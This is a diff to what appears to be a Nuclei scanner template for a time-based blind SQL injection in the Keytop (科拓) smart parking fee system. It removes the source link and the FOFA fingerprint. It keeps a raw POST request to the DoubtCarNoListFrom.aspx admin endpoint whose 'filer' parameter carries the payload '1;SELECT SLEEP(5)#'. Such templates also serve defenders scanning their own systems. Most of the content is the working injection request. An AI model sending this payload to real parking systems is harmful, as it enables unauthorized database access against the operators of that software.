@@ -3,14 +3,8 @@ info:
   name: 科拓全智能停车收费系统-SQL注入-DoubtCarNoListFrom
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gy78enp1bi9m3kxg
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gy78enp1bi9m3kxg
-    fofa: body="/KT_Css/qd_defaul.css"
 http:
 - raw:
   - 'POST /KT_Admin/CarCard/DoubtCarNoListFrom.aspx HTTP/1.1
@@ -29,8 +23,6 @@ http:
 
 
     Connection: close
-
-
 
 
     start=0&limit=20&filer=1;SELECT SLEEP(5)#
